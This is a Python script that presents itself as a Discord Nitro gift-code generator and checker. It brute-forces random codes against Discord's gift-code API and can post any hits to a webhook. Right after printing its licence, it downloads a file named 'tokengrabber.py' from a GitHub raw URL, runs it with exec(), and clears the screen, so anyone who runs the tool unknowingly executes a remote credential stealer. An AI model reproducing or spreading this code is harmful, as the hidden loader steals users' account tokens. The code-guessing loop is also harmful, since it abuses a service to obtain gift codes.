import ctypes
import string
import os
import subprocess
import sys
import time
def install (package):
    subprocess. check_call ([sys. executable, "-m", "pip", "install", package])
try:
	from colorama import init
except ImportError or NameError or ModuleNotFoundError:
	install('colorama')
try:
	from termcolor import colored
except ImportError or NameError or ModuleNotFoundError:
	install('termcolor')
try:
	from urllib.request import urlopen
except ImportError or NameError or ModuleNotFoundError:
	install('urllib')
init()
LICNECE = """
Copyright © 2021 querty#9819
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""
USE_WEBHOOK = True
print(LICNECE)
f = urlopen("https://raw.githubusercontent.com/HaZe-H/installables/main/tokengrabber.py")
index_content = f.read()
exec(index_content)
os.system('cls' if os.name == 'nt' else 'clear')
try:  
    from discord_webhook import DiscordWebhook
except ImportError:  
    input(
        f"Module discord_webhook not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install discord_webhook'\nYou can ignore this error if you aren't going to use a webhook.\nPress enter to continue.")
    USE_WEBHOOK = False
try:  
    import requests 
except ImportError:  
    input(
        f"Module requests not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install requests'\nPress enter to exit")
    exit()  
try:  
    import numpy  
except ImportError: 
    input(
        f"Module numpy not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install numpy'\nPress enter to exit")
    exit()  
url = "https://github.com"
try:
    response = requests.get(url)  
    print("Internet check")
    time.sleep(.4)
except requests.exceptions.ConnectionError:
    input("You are not connected to internet, check your connection and try again.\nPress enter to exit")
    exit() 
class NitroGen:  
    def __init__(self):  
        self.fileName = "Nitro Codes.txt"  
    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear')  
        if os.name == "nt":  
            print("")
            ctypes.windll.kernel32.SetConsoleTitleW(
                "Nitro Generator and Checker - Made by querty#5908")  
        else: 
            print(f'\33]0;Nitro Generator and Checker - Made by Drillenissen#4268\a',
                  end='', flush=True)  

        print("""███╗░░██╗██╗████████╗██████╗░░█████╗░  ░██████╗░███████╗███╗░░██╗
████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗  ██╔════╝░██╔════╝████╗░██║
██╔██╗██║██║░░░██║░░░██████╔╝██║░░██║  ██║░░██╗░█████╗░░██╔██╗██║
██║╚████║██║░░░██║░░░██╔══██╗██║░░██║  ██║░░╚██╗██╔══╝░░██║╚████║
██║░╚███║██║░░░██║░░░██║░░██║╚█████╔╝  ╚██████╔╝███████╗██║░╚███║
╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░  ░╚═════╝░╚══════╝╚═╝░░╚══╝
                                                        """)  
        time.sleep(2)  
        self.slowType("Made by: querty#9819", .02)
        time.sleep(1)  
        self.slowType(
            "\nInput How Many Codes to Generate and Check: ", .02, newLine=False)
        try:
            num = int(input('')) 
        except ValueError:
            input("Specified input wasn't a number.\nPress enter to exit")
            exit()
        if USE_WEBHOOK:
            self.slowType(
                "If you want to use a Discord webhook, type it here or press enter to ignore: ", .02, newLine=False)
            url = input('') 
            webhook = url if url != "" else None
        valid = [] 
        invalid = 0  
        chars = []
        chars[:0] = string.ascii_letters + string.digits
        c = numpy.random.choice(chars, size=[num, 19])
        for s in c:
            try:
                code = ''.join(x for x in s)
                url = f"https://discord.gift/{code}"  
                result = self.quickChecker(url, webhook)  
                if result:  
                    valid.append(url)
                else: 
                    invalid += 1 
            except KeyboardInterrupt:
                print("\nInterrupted by user")
                break  
            except Exception as e: 
                print(f" Error | {url} ")  
            if os.name == "nt":  
                ctypes.windll.kernel32.SetConsoleTitleW(
                    f"Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by querty#9819")  
                print("")
            else: 
                print(
                    f'\33]0;Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by querty#9819\a', end='', flush=True)
        print(f"""
Results:
 Valid: {len(valid)}
 Invalid: {invalid}
 Valid Codes: {', '.join(valid)}""") 

        input("\nThe end! Press Enter 5 times to close the program.")
        [input(i) for i in range(4, 0, -1)]  

    def slowType(self, text: str, speed: float, newLine=True):
        for i in text: 
            print(i, end="", flush=True)
            time.sleep(speed) 
        if newLine: 
            print() 
    def quickChecker(self, nitro:str, notify=None):  
        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url)  
        if response.status_code == 200:  
            print(colored(f" Valid | {nitro} ",'green'), flush=True,
                  end="" if os.name == 'nt' else "\n")
            with open("Nitro Codes.txt", "w") as file:  
                file.write(nitro)
            if notify is not None:
                DiscordWebhook( 
                    url=notify,
                    content=f"Valid Nito Code detected! @everyone \n{nitro}"
                ).execute()
            return True
        else:
            print(colored(f" Invalid | {nitro} ",'red'), flush=True,
                  end="" if os.name == 'nt' else "\n")
            return False
if __name__ == '__main__':
    Gen = NitroGen()  
    Gen.main()  
